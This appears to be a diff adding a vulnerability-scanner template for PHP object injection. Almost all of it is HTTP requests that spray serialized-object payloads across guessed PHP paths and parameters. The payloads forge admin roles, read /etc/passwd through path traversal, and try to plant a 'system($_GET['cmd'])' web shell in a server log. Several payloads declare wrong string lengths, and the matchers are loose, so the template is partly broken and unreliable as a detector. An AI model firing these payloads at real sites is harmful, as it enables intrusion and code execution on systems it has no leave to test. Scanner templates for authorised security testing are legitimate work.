@@ -1,0 +1,420 @@
+id: medium-webapp-insecure-deserialization-php-object
+
+info:
+  name: PHP Object Injection via Insecure Deserialization
+  author: elite-red-team
+  severity: critical
+  description: |
+    Detects PHP object injection vulnerabilities through insecure deserialization.
+    When user input is passed to unserialize() without proper validation, attackers
+    can inject malicious serialized objects leading to code execution, file manipulation, or data corruption.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
+    - https://portswigger.net/web-security/deserialization/exploiting
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-502
+  tags: php,deserialization,object-injection,rce,critical,medium
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=O:8:"stdClass":1:{s:4:"test";s:3:"123";}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+
+      - |
+        GET {{path}}?{{param}}=O:8:"stdClass":1:{s:4:"test";s:3:"123";} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"{{param}}": "O:8:\"stdClass\":1:{s:4:\"test\";s:3:\"123\";}"}
+
+    payloads:
+      path:
+        - "/index.php"
+        - "/login.php"
+        - "/user.php"
+        - "/profile.php"
+        - "/admin.php"
+        - "/api.php"
+        - "/data.php"
+        - "/session.php"
+        - "/cache.php"
+        - "/config.php"
+        - "/settings.php"
+        - "/preferences.php"
+        - "/api/user"
+        - "/api/profile"
+        - "/api/session"
+
+      param:
+        - "data"
+        - "user"
+        - "session"
+        - "profile"
+        - "config"
+        - "settings"
+        - "preferences"
+        - "cache"
+        - "object"
+        - "serialized"
+        - "payload"
+        - "input"
+
+    attack: clusterbomb
+    threads: 10
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "Fatal error"
+          - "Parse error"
+          - "Warning"
+          - "Notice"
+          - "unserialize"
+          - "Object"
+          - "stdClass"
+          - "__wakeup"
+          - "__destruct"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: php_errors
+        regex:
+          - '(?i)(Fatal error|Parse error|Warning|Notice).*'
+          - '(?i)(unserialize|Object|stdClass|__wakeup|__destruct)'
+
+      - type: regex
+        name: serialized_object
+        regex:
+          - 'O:[0-9]+:"[^"]*":[0-9]+:\{.*\}'
+
+# Test with magic method exploitation
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=O:10:"FileWriter":1:{s:8:"filename";s:10:"/etc/passwd";}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=O:9:"LogWriter":2:{s:4:"file";s:22:"/var/log/apache/access";s:4:"data";s:29:"<?php system($_GET['cmd']); ?>";}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=O:5:"Cache":1:{s:3:"key";s:16:"../../../etc/passwd";}
+
+    payloads:
+      path:
+        - "/upload.php"
+        - "/file.php"
+        - "/log.php"
+        - "/cache.php"
+        - "/api/upload"
+        - "/api/file"
+
+      param:
+        - "file"
+        - "cache"
+        - "log"
+        - "writer"
+        - "handler"
+
+    attack: clusterbomb
+    threads: 8
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "FileWriter"
+          - "LogWriter"
+          - "Cache"
+          - "file"
+          - "log"
+          - "passwd"
+          - "system"
+          - "Fatal error"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: magic_method_response
+        regex:
+          - '(?i)(FileWriter|LogWriter|Cache|passwd|system)'
+
+# Test with POP chain exploitation
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=O:12:"PDOStatement":1:{s:12:"queryString";s:26:"SELECT * FROM users WHERE 1";}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=O:9:"Exception":2:{s:7:"message";s:15:"Injected object";s:4:"file";s:10:"/etc/passwd";}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=O:8:"DateTime":1:{s:4:"date";s:19:"2023-01-01 00:00:00";}
+
+    payloads:
+      path:
+        - "/database.php"
+        - "/db.php"
+        - "/query.php"
+        - "/api/db"
+
+      param:
+        - "query"
+        - "statement"
+        - "exception"
+        - "datetime"
+        - "object"
+
+    attack: clusterbomb
+    threads: 5
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "PDOStatement"
+          - "Exception"
+          - "DateTime"
+          - "queryString"
+          - "message"
+          - "Fatal error"
+          - "SQL"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: pop_chain_response
+        regex:
+          - '(?i)(PDOStatement|Exception|DateTime|queryString|SQL)'
+
+# Test with session deserialization
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=test123
+        
+        {{param}}=user|O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: session_data={{session_payload}}
+        
+        test=value
+
+    payloads:
+      path:
+        - "/session.php"
+        - "/login.php"
+        - "/auth.php"
+        - "/api/session"
+
+      param:
+        - "session"
+        - "sess_data"
+        - "user_data"
+        - "auth_data"
+
+      session_payload:
+        - "O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}"
+        - "O:7:\"Session\":1:{s:4:\"data\";s:4:\"test\";}"
+
+    attack: clusterbomb
+    threads: 5
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+          - 500
+
+      - type: word
+        words:
+          - "User"
+          - "Session"
+          - "admin"
+          - "session"
+          - "logged"
+          - "welcome"
+          - "Fatal error"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: session_response
+        regex:
+          - '(?i)(User|Session|admin|logged|welcome)'
+
+# Test with base64 encoded payloads
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}={{base64_payload}}
+
+      - |
+        GET {{path}}?{{param}}={{base64_payload}} HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      path:
+        - "/data.php"
+        - "/api/data"
+        - "/process.php"
+
+      param:
+        - "data"
+        - "payload"
+        - "input"
+        - "encoded"
+
+      base64_payload:
+        - "Tzo4OiJzdGRDbGFzcyI6MTp7czo0OiJ0ZXN0IjtzOjM6IjEyMyI7fQ==" # O:8:"stdClass":1:{s:4:"test";s:3:"123";}
+        - "Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7fQ==" # O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+
+    attack: clusterbomb
+    threads: 5
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "stdClass"
+          - "User"
+          - "admin"
+          - "test"
+          - "Fatal error"
+          - "unserialize"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: base64_response
+        regex:
+          - '(?i)(stdClass|User|admin|unserialize)'
+
+# Test with URL encoded payloads
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A3%3A%22123%22%3B%7D
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=O%3A4%3A%22User%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22role%22%3Bs%3A5%3A%22admin%22%3B%7D
+
+    payloads:
+      path:
+        - "/process.php"
+        - "/handler.php"
+        - "/api/process"
+
+      param:
+        - "data"
+        - "object"
+        - "serialized"
+
+    attack: clusterbomb
+    threads: 5
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "stdClass"
+          - "User"
+          - "admin"
+          - "Fatal error"
+          - "Parse error"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: url_encoded_response
+        regex:
+          - '(?i)(stdClass|User|admin|Fatal error|Parse error)'
